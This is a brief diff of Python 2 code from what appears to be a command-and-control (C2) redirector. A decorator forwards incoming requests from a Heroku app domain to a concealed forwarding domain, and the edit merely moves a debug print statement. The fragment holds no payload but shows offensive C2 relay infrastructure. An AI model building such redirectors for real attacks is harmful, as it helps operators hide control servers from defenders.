@@ -71,8 +71,8 @@ def proxy_required(func):
         try:
             if __DEBUG:
                 debug_req.print_request(request)
+                print request.url.replace('tranquil-dawn-50102.herokuapp.com', __FORWARD_DOMAIN)
             # setup our proxy for C2
-            print request.url.replace('tranquil-dawn-50102.herokuapp.com', __FORWARD_DOMAIN)
             resp = requests.request(
                 method=request.method,
                 url=request.url.replace('tranquil-dawn-50102.herokuapp.com', __FORWARD_DOMAIN),
